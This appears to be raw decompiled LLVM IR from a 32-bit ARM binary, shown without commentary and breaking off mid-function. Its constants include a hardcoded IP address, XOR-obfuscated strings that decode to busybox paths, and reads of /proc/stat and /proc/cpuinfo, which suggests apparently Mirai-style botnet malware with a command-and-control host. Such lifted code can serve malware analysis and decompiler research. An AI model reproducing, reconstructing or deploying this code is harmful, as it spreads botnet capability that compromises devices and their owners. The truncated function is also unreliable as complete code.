source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_d8ec.14 = constant i32 -382906384
@global_var_1e9c4.19 = global i32 0
@global_var_82dc.20 = constant i32 -352321547
@global_var_12898.21 = constant i32 -382909968
@global_var_bd54.27 = constant i32 -382906384
@global_var_c18c.29 = constant i32 -382906384
@global_var_b5c8.31 = constant i32 -382906384
@global_var_af1c.33 = constant i32 -382906384
@global_var_a824.35 = constant i32 -382906384
@global_var_a070.37 = constant i32 -382906384
@global_var_9000.40 = constant i32 -382906384
@global_var_896c.42 = constant i32 -382906384
@global_var_961c.44 = constant i32 -382906384
@global_var_20a4c.46 = global i32 0
@global_var_20a54.58 = global i32 0
@global_var_1616c.60 = constant i32 47
@global_var_1e9c8.63 = global i32 0
@global_var_20a50.65 = global i32 0
@global_var_10ba4.67 = constant i32 -382910336
@global_var_d7b4.69 = constant i32 -382910448
@global_var_16170.75 = constant [15 x i8] c"212.237.54.173\00"
@global_var_20a5c.78 = local_unnamed_addr global i32 0
@global_var_20a5a.79 = local_unnamed_addr global i32 0
@global_var_1e9cc.81 = global i32 0
@global_var_16180.89 = constant i32 10
@global_var_10dd8.95 = constant i32 -382910336
@global_var_16184.99 = constant i32 16777216
@global_var_1e9d4.101 = global i32 0
@global_var_1e9e0.103 = global i32 0
@global_var_1e9d8.105 = global i32 0
@global_var_1e9dc.107 = global i32 0
@global_var_1ea18.121 = global i32 0
@global_var_1e9e4.123 = global i32 0
@global_var_1ea10.125 = global i32 0
@global_var_20a70.129 = global i32 0
@global_var_20a68.133 = global i32 0
@global_var_20a6c.135 = global i32 0
@global_var_1e9ea.138 = local_unnamed_addr global i32 0
@global_var_1e9ec.142 = local_unnamed_addr global i32 0
@global_var_1e9f0.143 = local_unnamed_addr global i32 0
@global_var_1e9f1.144 = local_unnamed_addr global i32 0
@global_var_1ea0a.147 = local_unnamed_addr global i32 0
@global_var_16190.149 = constant i32 0
@global_var_1618c.151 = constant [5 x i8] c"&;; \00"
@global_var_16194.153 = constant [5 x i8] c"5:?;\00"
@global_var_1619c.155 = constant [9 x i8] c"<!: acam\00"
@global_var_161a8.157 = constant [7 x i8] c" 18:1 \00"
@global_var_161b0.159 = constant [8 x i8] c"0125!8 \00"
@global_var_161b8.161 = constant [9 x i8] c"$5''#;&0\00"
@global_var_161c4.163 = constant [6 x i8] c"509=:\00"
@global_var_161cc.165 = constant [6 x i8] c"\22=.,\22\00"
@global_var_161d4.167 = constant [8 x i8] c"'!$$;& \00"
@global_var_161dc.169 = constant i32 423502179
@global_var_161ec.171 = constant [6 x i8] c"efg`a\00"
@global_var_161f4.173 = constant [5 x i8] c"!'1&\00"
@global_var_161fc.175 = constant i32 943467547
@global_var_16208.177 = constant i32 322070023
@global_var_1e9f4.178 = local_unnamed_addr global i32 0
@global_var_1e9f2.179 = local_unnamed_addr global i32 0
@global_var_1e9f8.180 = local_unnamed_addr global i32 0
@global_var_1ea00.182 = local_unnamed_addr global i32 0
@global_var_1ea0c.183 = local_unnamed_addr global i32 0
@global_var_e324.185 = constant i32 -382910352
@global_var_16214.187 = constant [3 x i8] c"\0D\0A\00"
@global_var_16220.189 = constant i32 2096127
@global_var_16217.191 = constant i32 2095871
@global_var_20a78.197 = global i32 0
@global_var_16224.204 = constant [3 x i8] c"Qm\00"
@global_var_20a80.205 = local_unnamed_addr global i32 0
@global_var_20a84.206 = local_unnamed_addr global i32 0
@global_var_16228.208 = constant [14 x i8] c"0;'9-=$z78!6T\00"
@global_var_20a88.209 = local_unnamed_addr global i32 0
@global_var_20a8c.210 = local_unnamed_addr global i32 0
@global_var_20a90.211 = local_unnamed_addr global i32 0
@global_var_20a94.212 = local_unnamed_addr global i32 0
@global_var_16238.214 = constant i32 59987
@global_var_20a98.215 = local_unnamed_addr global i32 0
@global_var_20a9c.216 = local_unnamed_addr global i32 0
@global_var_163b8.218 = constant i32 808465680
@global_var_20aa4.219 = local_unnamed_addr global i32 0
@global_var_20aa0.220 = local_unnamed_addr global i32 0
@global_var_1623c.222 = constant [7 x i8] c"'<188T\00"
@global_var_20aa8.223 = local_unnamed_addr global i32 0
@global_var_20aac.224 = local_unnamed_addr global i32 0
@global_var_16244.226 = constant [8 x i8] c"1:5681T\00"
@global_var_20ab0.227 = local_unnamed_addr global i32 0
@global_var_20ab4.228 = local_unnamed_addr global i32 0
@global_var_1624c.230 = constant [8 x i8] c"'-' 19T\00"
@global_var_20ab8.231 = local_unnamed_addr global i32 0
@global_var_20abc.232 = local_unnamed_addr global i32 0
@global_var_16254.234 = constant [4 x i8] c"'<T\00"
@global_var_20ac4.235 = local_unnamed_addr global i32 0
@global_var_20ac0.236 = local_unnamed_addr global i32 0
@global_var_16258.238 = constant i32 977090171
@global_var_20acc.239 = local_unnamed_addr global i32 0
@global_var_20ac8.240 = local_unnamed_addr global i32 0
@global_var_1626c.242 = constant i32 470227742
@global_var_20ad4.243 = local_unnamed_addr global i32 0
@global_var_20ad0.244 = local_unnamed_addr global i32 0
@global_var_16288.246 = constant [10 x i8] c":7;&&17 T\00"
@global_var_20adc.247 = local_unnamed_addr global i32 0
@global_var_20ad8.248 = local_unnamed_addr global i32 0
@global_var_16294.250 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_20ae0.251 = local_unnamed_addr global i32 0
@global_var_20ae4.252 = local_unnamed_addr global i32 0
@global_var_162a8.254 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_20aec.255 = local_unnamed_addr global i32 0
@global_var_20ae8.256 = local_unnamed_addr global i32 0
@global_var_162c0.258 = constant [8 x i8] c"{$&;7{T\00"
@global_var_20af0.259 = local_unnamed_addr global i32 0
@global_var_20af4.260 = local_unnamed_addr global i32 0
@global_var_162c8.262 = constant [6 x i8] c"{1,1T\00"
@global_var_20af8.263 = local_unnamed_addr global i32 0
@global_var_20afc.264 = local_unnamed_addr global i32 0
@global_var_162d0.266 = constant [5 x i8] c"{20T\00"
@global_var_20b04.267 = local_unnamed_addr global i32 0
@global_var_20b00.268 = local_unnamed_addr global i32 0
@global_var_162d8.270 = constant [7 x i8] c"{95$'T\00"
@global_var_20b08.271 = local_unnamed_addr global i32 0
@global_var_20b0c.272 = local_unnamed_addr global i32 0
@global_var_162e0.274 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_20b10.275 = local_unnamed_addr global i32 0
@global_var_20b14.276 = local_unnamed_addr global i32 0
@global_var_162f0.278 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_20b78.279 = local_unnamed_addr global i32 0
@global_var_162fc.281 = constant [8 x i8] c"z5:=91T\00"
@global_var_20b80.282 = local_unnamed_addr global i32 0
@global_var_16304.284 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_20b18.285 = local_unnamed_addr global i32 0
@global_var_20b1c.286 = local_unnamed_addr global i32 0
@global_var_16318.288 = constant [24 x i8] c"3e567`09;ga<:$f8=1d?>2T\00"
@global_var_20b20.289 = local_unnamed_addr global i32 0
@global_var_20b24.290 = local_unnamed_addr global i32 0
@global_var_16330.292 = constant [9 x i8] c"5''#;&0T\00"
@global_var_20b28.293 = local_unnamed_addr global i32 0
@global_var_20b2c.294 = local_unnamed_addr global i32 0
@global_var_163d8.296 = constant i32 557516544
@global_var_20b34.297 = local_unnamed_addr global i32 0
@global_var_20b30.298 = local_unnamed_addr global i32 0
@global_var_1633c.300 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_20b3c.301 = local_unnamed_addr global i32 0
@global_var_20b38.302 = local_unnamed_addr global i32 0
@global_var_16350.304 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_20b44.305 = local_unnamed_addr global i32 0
@global_var_20b40.306 = local_unnamed_addr global i32 0
@global_var_16360.308 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_20b48.309 = local_unnamed_addr global i32 0
@global_var_20b4c.310 = local_unnamed_addr global i32 0
@global_var_16370.312 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_20b54.313 = local_unnamed_addr global i32 0
@global_var_20b50.314 = local_unnamed_addr global i32 0
@global_var_16384.316 = constant [9 x i8] c"$662*7!E\00"
@global_var_20b58.317 = local_unnamed_addr global i32 0
@global_var_20b5c.318 = local_unnamed_addr global i32 0
@global_var_16390.320 = constant [6 x i8] c";3=:T\00"
@global_var_20b60.321 = local_unnamed_addr global i32 0
@global_var_20b64.322 = local_unnamed_addr global i32 0
@global_var_16398.324 = constant [7 x i8] c"1: 1&T\00"
@global_var_20b68.325 = local_unnamed_addr global i32 0
@global_var_20b6c.326 = local_unnamed_addr global i32 0
@global_var_163a0.328 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_20b74.329 = local_unnamed_addr global i32 0
@global_var_20b70.330 = local_unnamed_addr global i32 0
@global_var_10e9c.336 = constant i32 -443088884
@global_var_1ea38.353 = global i32 0
@global_var_112cc.355 = constant i32 -456978431
@global_var_d0c8.367 = constant [3 x i8] c"$\0B\00"
@global_var_20b88.369 = global i32 0
@global_var_11888.375 = constant i32 -478871519
@global_var_c624.379 = constant i32 -481099730
@global_var_c4ec.386 = constant i32 -443744156
@global_var_12308.391 = constant i32 -478805983
@global_var_126e4.400 = constant i32 -382906384
@global_var_1ea1c.408 = local_unnamed_addr global i32 0
@global_var_1416c.410 = constant i32 -509591552
@global_var_1ea20.419 = local_unnamed_addr global i32 0
@global_var_14ba0.422 = constant i32 -382909968
@global_var_12f44.423 = constant i32 -494075872
@global_var_10da0.424 = constant i32 -382910336
@global_var_16408.428 = constant [11 x i8] c"/proc/stat\00"
@global_var_16414.431 = constant i32 32
@global_var_16418.434 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_16428.436 = constant [10 x i8] c"processor\00"
@global_var_1644c.438 = constant i32 604672
@global_var_13104.441 = constant i32 -369098421
@global_var_1ea30.454 = local_unnamed_addr global i32 0
@global_var_1ea34.456 = local_unnamed_addr global i32 0
@global_var_16450.459 = constant [10 x i8] c"/dev/null\00"
@global_var_12b14.460 = constant i32 -442543860
@global_var_14b04.465 = constant i32 -382910352
@global_var_11300.470 = constant i32 -369094618
@global_var_13ad0.483 = constant i32 -335545128
@global_var_13f98.489 = constant i32 -382909456
@global_var_20a48.492 = local_unnamed_addr global i32 0
@global_var_16430.500 = constant i32 114
@global_var_14fc4.505 = constant i32 -382906384
@global_var_20003.514 = global i32 0
@global_var_20000.515 = global i32 0
@global_var_14aa4.525 = constant i32 -509607926
@global_var_1675c.530 = constant i32 0
@global_var_15f58.531 = constant i32 -382909968
@global_var_14de8.541 = constant i32 -509607928
@global_var_1e9a4.2 = external global i8*
@global_var_1e9c0.17 = external global i8*
@global_var_1e9c1.25 = global i8 0
@1 = internal constant [4 x i8] c"\04\E8\01\00"
@global_var_20a58.77 = global i16* null
@global_var_1e9d0.93 = external global i8*
@global_var_1ea14.127 = global i16* null
@global_var_1e9e8.137 = external global i8*
@global_var_1e9fc.140 = global i16 0
@global_var_1ea08.141 = local_unnamed_addr global i8 0
@global_var_1e9fe.145 = local_unnamed_addr global i16 0
@global_var_1ea09.146 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_8098)
  %v31_80a0 = load i32, i32* @r0, align 4
  ret i32 %v31_80a0
}

define i32 @function_80b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 ptrtoint (i8** @global_var_1e9a4.2 to i32), i32* @r4, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1e9a4.2 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %dec_label_pc_80c4, label %dec_label_pc_80e0

dec_label_pc_80c4:                                ; preds = %entry
  store i1 true, i1* @cpsr_z, align 1
  %v3_80d4 = call i32 @function_80ec()
  %v2_80dc = load i32, i32* @r4, align 4
  %v3_80dc = inttoptr i32 %v2_80dc to i8*
  store i8 1, i8* %v3_80dc, align 1
  br label %dec_label_pc_80e0

dec_label_pc_80e0:                                ; preds = %entry, %dec_label_pc_80c4
  %.0 = phi i32 [ %v3_80d4, %dec_label_pc_80c4 ], [ undef, %entry ]
  ret i32 %.0

; uselistorder directives
  uselistorder i8** @global_var_1e9a4.2, { 1, 0 }
  uselistorder label %dec_label_pc_80e0, { 1, 0 }
}

define i32 @function_80ec() local_unnamed_addr {
dec_label_pc_80ec:
  %v0_80f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_80f0, label %bb, label %dec_label_pc_80ec._crit_edge

dec_label_pc_80ec._crit_edge:                     ; preds = %dec_label_pc_80ec
  br label %bb4

bb:                                               ; preds = %dec_label_pc_80ec
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80ec._crit_edge, %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8118 = load i32, i32* inttoptr (i32 124800 to i32*), align 128
  %v2_811c = icmp eq i32 %v2_8118, 0
  br i1 %v2_811c, label %dec_label_pc_8134, label %dec_label_pc_8124

dec_label_pc_8124:                                ; preds = %bb4
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8134

dec_label_pc_8134:                                ; preds = %bb4, %dec_label_pc_8124
  ret i32 124800

; uselistorder directives
  uselistorder label %dec_label_pc_8134, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_815c = ptrtoint i32* %stack_var_4 to i32
  %v8_817c = call i32 @function_13840(i32 ptrtoint (i32* @global_var_d8ec.14 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 90460, i32 %arg1, i32 %v4_815c)
  %v0_8180 = call i32 @function_12b14()
  ret i32 %v0_8180
}

define i32 @function_8190(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8190:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_8190 = icmp eq i32 %arg1, 0
  br i1 %v2_8190, label %dec_label_pc_81d8, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %dec_label_pc_8190
  %v0_81a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81a0 = add i32 %v0_81a0, 4
  %v2_81a0 = inttoptr i32 %v1_81a0 to i8*
  %v3_81a0 = load i8, i8* %v2_81a0, align 1
  %v4_81a0 = zext i8 %v3_81a0 to i32
  %v9_81a4 = icmp eq i32 %v4_81a0, %arg3
  br i1 %v9_81a4, label %dec_label_pc_81e4, label %dec_label_pc_81c8.preheader

dec_label_pc_81c8.preheader:                      ; preds = %dec_label_pc_81a0
  br label %dec_label_pc_81c8

dec_label_pc_81b8:                                ; preds = %dec_label_pc_81c8
  %v1_81b8 = add i32 %v0_81c0.in, 12
  %v2_81b8 = inttoptr i32 %v1_81b8 to i8*
  %v3_81b8 = load i8, i8* %v2_81b8, align 1
  %v4_81b8 = zext i8 %v3_81b8 to i32
  %v9_81bc = icmp eq i32 %v4_81b8, %arg3
  br i1 %v9_81bc, label %dec_label_pc_81e4, label %dec_label_pc_81c8

dec_label_pc_81c8:                                ; preds = %dec_label_pc_81c8.preheader, %dec_label_pc_81b8
  %v0_81c0.in = phi i32 [ %v0_81a0, %dec_label_pc_81c8.preheader ], [ %v0_81c0, %dec_label_pc_81b8 ]
  %v0_81c8 = phi i32 [ 0, %dec_label_pc_81c8.preheader ], [ %v1_81c8, %dec_label_pc_81b8 ]
  %v0_81c0 = add i32 %v0_81c0.in, 8
  %v1_81c8 = add i32 %v0_81c8, 1
  %v9_81cc = icmp eq i32 %v1_81c8, %arg1
  store i32 %v0_81c0, i32* %r1.global-to-local, align 4
  br i1 %v9_81cc, label %dec_label_pc_81d8, label %dec_label_pc_81b8

dec_label_pc_81d8:                                ; preds = %dec_label_pc_81c8, %dec_label_pc_8190, %dec_label_pc_81e4
  %v0_81d8 = phi i32 [ %arg4, %dec_label_pc_8190 ], [ %v2_81e4, %dec_label_pc_81e4 ], [ %arg4, %dec_label_pc_81c8 ]
  ret i32 %v0_81d8

dec_label_pc_81e4:                                ; preds = %dec_label_pc_81b8, %dec_label_pc_81a0
  %v0_81e4 = phi i32 [ %v0_81a0, %dec_label_pc_81a0 ], [ %v0_81c0, %dec_label_pc_81b8 ]
  %v1_81e4 = inttoptr i32 %v0_81e4 to i32*
  %v2_81e4 = load i32, i32* %v1_81e4, align 4
  br label %dec_label_pc_81d8

; uselistorder directives
  uselistorder i32 %v1_81c8, { 1, 0 }
  uselistorder i32 %v0_81c0, { 1, 0, 2 }
  uselistorder i32 %v0_81c0.in, { 1, 0 }
  uselistorder i32 %v0_81a0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_81d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_81c8, { 1, 0 }
}

define i32 @function_81ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_81ec:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_81ec = load i32, i32* @r4, align 4
  store i32 %v3_81ec, i32* %stack_var_-32, align 4
  %v6_81ec = load i32, i32* @r5, align 4
  %v9_81ec = load i32, i32* @r6, align 4
  %v12_81ec = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  %v0_8204 = call i32 @function_10ac8()
  store i32 %v0_8204, i32* @r0, align 4
  %v7_8208 = icmp eq i32 %v0_8204, -1
  %tmp23 = icmp slt i32 %v0_8204, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_81ec
  br label %dec_label_pc_8228

bb24:                                             ; preds = %dec_label_pc_81ec
  %. = zext i1 %v7_8208 to i32
  store i32 %., i32* @r5, align 4
  %v2_8220 = icmp eq i1 %v7_8208, false
  br i1 %v2_8220, label %dec_label_pc_8230, label %dec_label_pc_8228

dec_label_pc_8228:                                ; preds = %.thread2, %bb24
  %v2_8228 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8228, i32* @r4, align 4
  store i32 %v6_81ec, i32* @r5, align 4
  store i32 %v9_81ec, i32* @r6, align 4
  store i32 %v12_81ec, i32* @r7, align 4
  ret i32 %v0_8204

dec_label_pc_8230:                                ; preds = %bb24
  %v0_8230 = call i32 @function_10ac8()
  %v7_8234 = icmp eq i32 %v0_8230, -1
  store i32 %v0_8230, i32* @r4, align 4
  br i1 %v7_8234, label %dec_label_pc_8264, label %dec_label_pc_8240

dec_label_pc_8240:                                ; preds = %dec_label_pc_8230
  %v2_8240 = icmp eq i32 %v0_8230, 0
  br i1 %v2_8240, label %dec_label_pc_8248, label %dec_label_pc_826c

dec_label_pc_8248:                                ; preds = %dec_label_pc_8240
  %v0_8248 = load i32, i32* @r6, align 4
  %v1_824c = call i32 @function_12ef0(i32 %v0_8248)
  store i32 %v1_824c, i32* @r0, align 4
  %v0_8250 = call i32 @function_1099c()
  %v2_8258 = call i32 @function_10ba4(i32 %v0_8250, i32 9)
  %v0_825c = load i32, i32* @r4, align 4
  %v1_8260 = call i32 @function_12e38(i32 %v0_825c)
  br label %dec_label_pc_8264

dec_label_pc_8264:                                ; preds = %dec_label_pc_8230, %dec_label_pc_8248
  %v0_8264 = load i32, i32* @r5, align 4
  %v1_8268 = call i32 @function_12e38(i32 %v0_8264)
  br label %dec_label_pc_826c

dec_label_pc_826c:                                ; preds = %dec_label_pc_8240, %dec_label_pc_8264
  %v2_8270 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8270 = zext i8 %v2_8270 to i32
  %v2_8274 = icmp eq i8 %v2_8270, 0
  br i1 %v2_8274, label %dec_label_pc_82b8, label %dec_label_pc_827c

dec_label_pc_827c:                                ; preds = %dec_label_pc_826c
  %v2_8280 = load i32, i32* @global_var_1e9c4.19, align 4
  %v1_8284 = inttoptr i32 %v2_8280 to i32*
  %v2_8284 = load i32, i32* %v1_8284, align 4
  store i32 %v2_8284, i32* @ip, align 4
  %v1_8288 = add i32 %v2_8284, 4
  %v2_8288 = inttoptr i32 %v1_8288 to i8*
  %v3_8288 = load i8, i8* %v2_8288, align 1
  %v4_8288 = zext i8 %v3_8288 to i32
  %v1_828c = load i32, i32* @r7, align 4
  %v9_828c = icmp eq i32 %v4_8288, %v1_828c
  br i1 %v9_828c, label %dec_label_pc_82c0, label %dec_label_pc_82ac.preheader

dec_label_pc_82ac.preheader:                      ; preds = %dec_label_pc_827c
  %v1_8290 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ac

dec_label_pc_829c:                                ; preds = %dec_label_pc_82ac
  %v4_829c = mul i32 %v1_82ac, 4
  %v5_829c = add i32 %v4_829c, %v2_8280
  %v6_829c = inttoptr i32 %v5_829c to i32*
  %v7_829c = load i32, i32* %v6_829c, align 4
  store i32 %v7_829c, i32* @ip, align 4
  %v1_82a0 = add i32 %v7_829c, 4
  %v2_82a0 = inttoptr i32 %v1_82a0 to i8*
  %v3_82a0 = load i8, i8* %v2_82a0, align 1
  %v4_82a0 = zext i8 %v3_82a0 to i32
  %v9_82a4 = icmp eq i32 %v4_82a0, %v1_828c
  br i1 %v9_82a4, label %dec_label_pc_82c0, label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_82ac.preheader, %dec_label_pc_829c
  %v0_82ac = phi i32 [ %v1_8290, %dec_label_pc_82ac.preheader ], [ %v1_82ac, %dec_label_pc_829c ]
  %v1_82ac = add i32 %v0_82ac, 1
  %v9_82b0 = icmp eq i32 %v1_82ac, %v3_8270
  br i1 %v9_82b0, label %dec_label_pc_82b8, label %dec_label_pc_829c

dec_label_pc_82b8:                                ; preds = %dec_label_pc_82ac, %dec_label_pc_826c, %dec_label_pc_82c0
  %v1_82bc = call i32 @function_12e38(i32 0)
  %v0_82d0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_82c0

dec_label_pc_82c0:                                ; preds = %dec_label_pc_829c, %dec_label_pc_827c, %dec_label_pc_82b8
  %v0_82d0 = phi i32 [ %v2_8284, %dec_label_pc_827c ], [ %v0_82d0.pre, %dec_label_pc_82b8 ], [ %v7_829c, %dec_label_pc_829c ]
  %v1_82d0 = inttoptr i32 %v0_82d0 to i32*
  %v2_82d0 = load i32, i32* %v1_82d0, align 4
  store i32 %v2_82d0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_82d0)
  br label %dec_label_pc_82b8

; uselistorder directives
  uselistorder i32 %v1_82ac, { 2, 0, 1 }
  uselistorder i32 %v0_8230, { 1, 2, 0 }
  uselistorder i1 %v7_8208, { 1, 0 }
  uselistorder i32 %v0_8204, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_82c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_826c, { 1, 0 }
  uselistorder label %dec_label_pc_8264, { 1, 0 }
  uselistorder label %dec_label_pc_8228, { 1, 0 }
}

define i32 @function_82e8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_82e8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_82e8 = load i32, i32* @r5, align 4
  %v9_82e8 = load i32, i32* @r6, align 4
  %v12_82e8 = load i32, i32* @r7, align 4
  %v18_82e8 = load i32, i32* @sb, align 4
  %v24_82e8 = load i32, i32* @fp, align 4
  %v2_82ec = icmp ugt i32 %arg2, 2
  %v7_82ec = icmp eq i32 %arg2, 3
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_82f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_82f8, i32* @r5, align 4
  %v2_82fc = xor i1 %v7_82ec, true
  %v3_82fc = and i1 %v2_82ec, %v2_82fc
  br i1 %v3_82fc, label %dec_label_pc_830c, label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_834c, %.dec_label_pc_8300_crit_edge, %dec_label_pc_8340, %dec_label_pc_8330, %dec_label_pc_830c, %dec_label_pc_82e8, %dec_label_pc_84f8
  %v1_8308 = phi i32 [ %v1_8308.pre, %.dec_label_pc_8300_crit_edge ], [ %v1_8310, %dec_label_pc_834c ], [ %v1_8310, %dec_label_pc_8340 ], [ %v1_8310, %dec_label_pc_8330 ], [ %v1_8310, %dec_label_pc_830c ], [ %v0_82f8, %dec_label_pc_82e8 ], [ %v0_84fc, %dec_label_pc_84f8 ]
  store i32 %v6_82e8, i32* @r5, align 4
  store i32 %v9_82e8, i32* @r6, align 4
  store i32 %v12_82e8, i32* @r7, align 4
  store i32 %v18_82e8, i32* @sb, align 4
  store i32 %v24_82e8, i32* @fp, align 4
  ret i32 %v1_8308

dec_label_pc_830c:                                ; preds = %dec_label_pc_82e8
  %v1_830c = inttoptr i32 %v0_82f8 to i32*
  %v2_830c = load i32, i32* %v1_830c, align 4
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v1_8310 = and i32 %v2_830c, 16711680
  store i32 %v1_8310, i32* %r0.global-to-local, align 4
  %v3_8314 = udiv i32 %v2_830c, 16777216
  %v4_8318 = udiv i32 %v1_8310, 256
  %v5_8318 = or i32 %v4_8318, %v3_8314
  %v1_831c = and i32 %v2_830c, 65280
  store i32 %v1_831c, i32* %r2.global-to-local, align 4
  %v4_8320 = mul nuw nsw i32 %v1_831c, 256
  %v5_8320 = or i32 %v5_8318, %v4_8320
  store i32 %v5_8320, i32* %r3.global-to-local, align 4
  %v7_8324 = icmp eq i32 %arg2, 4
  store i1 %v7_8324, i1* %cpsr_z.global-to-local, align 1
  %v5_8328 = call i32 @llvm.bswap.i32(i32 %v2_830c)
  store i32 %v5_8328, i32* @fp, align 4
  br i1 %v7_8324, label %dec_label_pc_8300, label %dec_label_pc_8330

dec_label_pc_8330:                                ; preds = %dec_label_pc_830c
  %v1_8330 = add i32 %v0_82f8, 4
  %v2_8330 = inttoptr i32 %v1_8330 to i8*
  %v3_8330 = load i8, i8* %v2_8330, align 1
  %v4_8330 = zext i8 %v3_8330 to i32
  store i32 %v4_8330, i32* %r2.global-to-local, align 4
  %v7_8334 = icmp eq i32 %arg2, 5
  store i1 %v7_8334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8334, label %dec_label_pc_8300, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_8330
  %v1_8340 = add i32 %v0_82f8, 5
  %v2_8340 = inttoptr i32 %v1_8340 to i8*
  %v3_8340 = load i8, i8* %v2_8340, align 1
  %v4_8340 = zext i8 %v3_8340 to i32
  store i32 %v4_8340, i32* @sb, align 4
  %v2_8344 = icmp eq i8 %v3_8340, 0
  store i1 %v2_8344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8344, label %dec_label_pc_8300, label %dec_label_pc_834c

dec_label_pc_834c:                                ; preds = %dec_label_pc_8340
  %v2_8350 = mul nuw nsw i32 %v4_8340, 5
  store i32 %v2_8350, i32* @r7, align 4
  %v1_8354 = add i32 %arg2, -6
  store i32 %v1_8354, i32* %r3.global-to-local, align 4
  %v3_8358 = icmp ult i32 %v1_8354, %v2_8350
  %v9_8358 = icmp eq i32 %v1_8354, %v2_8350
  store i1 %v9_8358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8358, label %dec_label_pc_8300, label %dec_label_pc_8360

dec_label_pc_8360:                                ; preds = %dec_label_pc_834c
  store i32 %v4_8340, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8354, i32* @r6, align 4
  %v2_836c = call i32 @function_1214c(i32 %v4_8340, i32 24)
  store i32 %v2_836c, i32* @ip, align 4
  %v0_8378 = load i32, i32* @r7, align 4
  %v1_8378 = load i32, i32* @r4, align 4
  %v2_8378 = sub i32 %v1_8378, %v0_8378
  store i32 %v2_8378, i32* @r7, align 4
  %v0_837c = load i32, i32* @r5, align 4
  %v1_837c = add i32 %v0_837c, 11
  store i32 %v1_837c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8380, %dec_label_pc_8360
